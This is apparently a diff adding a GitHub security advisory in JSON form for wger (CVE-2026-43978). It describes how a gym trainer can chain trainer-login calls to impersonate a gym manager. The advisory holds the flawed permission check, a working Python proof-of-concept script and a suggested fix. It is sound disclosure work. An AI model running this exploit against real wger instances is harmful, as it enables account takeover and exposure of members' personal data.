@@ -1,0 +1,61 @@
+{
+  "id": "GHSA-9qpr-vc49-hqg2",
+  "modified": "2026-05-14T16:39:57.056408Z",
+  "published": "2026-05-14T16:16:30Z",
+  "aliases": [
+    "CVE-2026-43978"
+  ],
+  "summary": "wger: Privilege escalation via trainer-login session chaining allows gym trainer to impersonate gym manager",
+  "details": "### Summary\nA gym trainer can escalate their session to any higher-privileged account (gym manager, general manager) by chaining two calls to the trainer-login endpoint. Once a trainer performs a legitimate switch into a low-privileged user, the session flag `trainer.identity`\nis set and this flag alone bypasses the permission check on all subsequent trainer-login calls, allowing the trainer to hop into any account including gym managers.\n\n### Details\nIn `wger/core/views/user.py` lines 169–178, the permission check uses an AND condition:\n\n```python\n# Line 169 — passes if EITHER condition is false\nif not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):\n    return HttpResponseForbidden()\n\n# Line 173 — only runs when current user IS a trainer, not when identity is inherited\nif request.user.has_perm('gym.gym_trainer') and (\n    user.has_perm('gym.manage_gym') or user.has_perm('gym.manage_gyms')\n):\n    return HttpResponseForbidden()\n```\n\nAfter hop 1 (trainer → regular user), `request.user` is the regular user who has no `gym_trainer` permission, but `session['trainer.identity']` is set. Line 169 evaluates:\n`not False AND not False` → the second operand short-circuits the check. Line 173 is never reached because the current user is no longer a trainer. The attacker can therefore call trainer-login again targeting a manager account and it succeeds.\n\n\n### PoC\nRequirements: A running wger instance with at least one gym trainer account and one gym manager account in the same gym.\n\n```python\nimport requests\n\nBASE = 'http://localhost:80'\ns = requests.Session()\n\ndef whoami():\n    r = s.get(f'{BASE}/api/v2/userprofile/',\n              headers={'Accept': 'application/json'})\n    return r.json().get('username')\n\n# ─────────────────────────────────────────────\nprint(\"=\" * 55)\nprint(\"  PoC: Trainer Login Privilege Escalation\")\nprint(\"  wger/core/views/user.py:169\")\nprint(\"=\" * 55)\n\n# ─── STEP 1: Normal login as gym trainer ─────\nprint(\"\\n[STEP 1] Login as 'trainer1'\")\nprint(\"         trainer1 has ONLY 'gym.gym_trainer' permission\")\n\ns.get(f'{BASE}/en/user/login')\ns.post(f'{BASE}/en/user/login', data={\n    'username': 'trainer1',\n    'password': 'pass1234',\n    'csrfmiddlewaretoken': s.cookies['csrftoken'],\n})\nprint(f\"         Current user  : {whoami()}\")\nprint(f\"         Permission    : gym.gym_trainer (NOT manage_gym)\")\n\n# ─── STEP 2: Legitimate trainer-login ────────\nprint(\"\\n[STEP 2] trainer1 uses trainer-login to switch into 'regular1' (pk=4)\")\nprint(\"         This is ALLOWED — trainer1 has gym_trainer permission\")\nprint(\"         Side effect: session['trainer.identity'] = trainer1_pk\")\n\ns.get(f'{BASE}/en/user/4/trainer-login')\nprint(f\"         Current user  : {whoami()}\")\nprint(f\"         Session flag  : trainer.identity is now SET\")\n\n# ─── STEP 3: EXPLOIT ─────────────────────────\nprint(\"\\n[STEP 3] EXPLOIT — now as 'regular1', call trainer-login for 'manager1' (pk=3)\")\nprint(\"         regular1 has ZERO permissions\")\nprint(\"         BUT session['trainer.identity'] is set from Step 2\")\nprint(\"         Line 169 check: `not has_perm() AND not session.get()` → BYPASSED\")\n\ns.get(f'{BASE}/en/user/3/trainer-login')\nresult = whoami()\nprint(f\"         Current user  : {result}\")\n\n# ─── RESULT ──────────────────────────────────\nprint(\"\\n\" + \"=\" * 55)\nif result == 'manager1':\n    print(\"  RESULT : !! VULNERABLE !!\")\n    print(\"  trainer1 (gym_trainer) is now logged in as manager1\")\n    print(\"  manager1 has 'gym.manage_gym' — full gym admin access\")\nelse:\n    print(\"  RESULT : Not vulnerable (got: \" + result + \")\")\nprint(\"=\" * 55)\n```\n\nOutput on wger 2.5.0a2:\n\n\u003cimg width=\"728\" height=\"628\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e8affa3-4728-480c-bb57-929f66723ea5\" /\u003e\n\n### Impact\nAny authenticated gym trainer can take over a gym manager or general gym manager account within the same gym. This grants full gym administration capabilities including viewing all member data, modifying contracts, managing gym configuration, and accessing other trainers' and managers' personal information.\n\n### How to fix\n\nThe root cause is a logical error in wger/core/views/user.py at line 169. The AND operator means that if session['trainer.identity'] is set, the entire permission check is skipped — allowing any user who has previously been switched into to perform further trainer-login hops without holding the gym.gym_trainer permission themselves. Additionally, the target-user protection block at line 173 only executes when request.user is a trainer, so it never fires during a chained hop.\n\nVulnerable code (user.py:169–178):\n\n```\nif not request.user.has_perm('gym.gym_trainer') and not request.session.get('trainer.identity'):\n    return HttpResponseForbidden()\n\nif request.user.has_perm('gym.gym_trainer') and (\n    user.has_perm('gym.gym_trainer')\n    or user.has_perm('gym.manage_gym')\n    or user.has_perm('gym.manage_gyms')\n):\n    return HttpResponseForbidden()\n```\n\nSuggested fix:\n\n```\ntrainer_identity_pk = request.session.get('trainer.identity')\n\nif not request.user.has_perm('gym.gym_trainer'):\n    if not trainer_identity_pk:\n        return HttpResponseForbidden()\n    # Verify the original trainer in the session still holds the permission\n    original_trainer = get_object_or_404(User, pk=trainer_identity_pk)\n    if not original_trainer.has_perm('gym.gym_trainer'):\n        return HttpResponseForbidden()\n\n# Target-user check must apply in both direct and chained hop scenarios\nif (request.user.has_perm('gym.gym_trainer') or trainer_identity_pk) and (\n    user.has_perm('gym.gym_trainer')\n    or user.has_perm('gym.manage_gym')\n    or user.has_perm('gym.manage_gyms')\n):\n    return HttpResponseForbidden()\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wger",
+        "purl": "pkg:pypi/wger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2rc1",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9qpr-vc49-hqg2/GHSA-9qpr-vc49-hqg2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/security/advisories/GHSA-9qpr-vc49-hqg2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wger-project/wger"
+    }
+  ]
+}
